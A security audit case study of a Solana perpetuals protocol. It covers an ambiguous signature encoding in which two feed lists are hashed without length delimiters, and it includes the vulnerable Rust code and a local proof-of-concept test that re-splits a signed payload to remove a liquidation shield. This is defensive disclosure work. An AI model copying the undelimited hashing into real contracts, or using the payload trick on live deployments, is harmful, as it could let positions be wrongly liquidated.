# Source-code-based

Project: Name-redacted perpetuals protocol (PERP-01)
Category: Perpetuals
Severity: Medium — final client-report assignment; historical finding
Engagement: Private engagement
Chain: Solana
Tech stack: Rust, Anchor, Solana runtime, SPL Token/SPL Governance, oracle integrations; Rust local tests and configured Surfpool evidence where stated
Evidence: Original local test source and historical report; component, model or conditional-impact proof
Remediation: Acknowledged — historical report disposition; current deployment state is not asserted
Contribution: Team security engagement; this case study does not claim sole discovery.
Proof availability: Excerpts and source references; the original harness is not distributed.

# Autonom Market-Opening Signatures Use Ambiguous Encoding

## Description

Observer re-splits two concatenated variable-length feed vectors in a valid signed market-opening payload; no length delimiter commits their boundary and duplicate feed IDs survive containment checks, changing affected-feed state.

Report records integration-test liquidation-shield removal; project response disputes external exploitability because signer/config controls feed split. Conflict retained below.

The local integration helper signs constructed payloads and verifies that the alternate vector split produces the same hash. The final report records shield removal but also retains the project response that trusted deterministic feed configuration contains the ambiguity. Real backend issuance of an exploitable payload is not established here. No ability to forge signatures is claimed.

The excerpts span the affected implementation and later remediation where identified. They do not assert equivalence to a current deployment.

### Mechanism step by step

#### Step 1 — Sign concatenated vectors without their boundary

The signed message includes two variable-length lists consecutively without their lengths. feeds=[40], affected=[40] and feeds=[40,40], affected=[] therefore have identical bytes.

Source: `programs/[project]/src/state/autonom_market_opening_data.rs:20-32`

```rust
    pub fn build_message_hash(&self) -> Result<[u8; 32]> {
        let mut msg = vec![];

        msg.extend_from_slice(&self.market_open_timestamp.to_le_bytes());
        msg.extend_from_slice(&self.market_close_timestamp.to_le_bytes());

        self.feeds.iter().for_each(|feed_id| msg.push(*feed_id));
        self.market_close_affected_feeds
            .iter()
            .for_each(|feed_id| msg.push(*feed_id));

        Ok(hashv(&[msg.as_slice()]).to_bytes())
    }
```

#### Step 2 — Install the alternate affected-feed list

After verification and set-containment checks, the handler writes the chosen affected list. Repartitioning the signed bytes can remove the market-event liquidation shield if that valid signed payload is available.

Source: `programs/[project]/src/instructions/public/autonom_market_opening.rs:129-138`

```rust
        pool.market_close_affected_feeds = Default::default();

        for (i, ele) in params
            .opening_data
            .market_close_affected_feeds
            .iter()
            .enumerate()
        {
            pool.market_close_affected_feeds[i] = *ele;
        }
```

## Proof of concept

Test: `programs/[project]/tests/[auditor]_tests/m5_integ_autonom_ambiguous_sig.rs`; function `integ_shield_removal_enables_liquidation`.

The local integration helper signs constructed payloads and verifies that the alternate vector split produces the same hash. The final report records shield removal but also retains the project response that trusted deterministic feed configuration contains the ambiguity. Real backend issuance of an exploitable payload is not established here. No ability to forge signatures is claimed.

The excerpts show the original test assertions. Local funding, position construction, oracle inputs and any privileged setup are fixtures; they do not establish those conditions on a live deployment. The tests require their matching historical source revision, and repaired code may correctly reject the exploit expectation.

## Relevant test excerpts

Source: `programs/[project]/tests/[auditor]_tests/m5_integ_autonom_ambiguous_sig.rs:389-432`

```rust
    // The attacker crafts: feeds=[40, 40], close_affected=[].
    // This hashes identically to feeds=[40], close_affected=[40] (the legitimate
    // next-session payload), because the concatenation is [40, 40] in both cases.
    let attack_payload = utils::generate_autonom_market_opening_data(
        vec![synth_feed, synth_feed], // duplicate
        vec![],                       // affected list EMPTIED
        t2 - 10,
        t2 + MARKET_WINDOW,
    );
    let legit_equiv = utils::generate_autonom_market_opening_data(
        vec![synth_feed],
        vec![synth_feed],
        t2 - 10,
        t2 + MARKET_WINDOW,
    );
    assert_eq!(
        attack_payload.build_message_hash().unwrap(),
        legit_equiv.build_message_hash().unwrap(),
        "the attack payload must hash identically to the legitimate one"
    );

    // The attack payload verifies under the same signature the signer would
    // produce for the legitimate payload.
    attack_payload.verify_signature().unwrap();

    // Submit the attack opening on-chain.
    test_instructions::autonom_market_opening(
        &test_setup.program_test_ctx,
        &test_setup.payer_keypair,
        &test_setup.pool_pda,
        &[synthetic_custody_pda],
        AutonomMarketOpeningParams {
            opening_data: attack_payload,
        },
    )
    .await
    .unwrap();

    // Confirm pool state: feed 40 is NO LONGER in affected list.
    let pool: Pool =
        utils::get_zero_copy_account(&test_setup.program_test_ctx, test_setup.pool_pda).await;
    assert_eq!(
        pool.market_close_affected_feeds[0], 0,
        "ATTACK: feed 40 should NOT be in affected list after the attack"
```
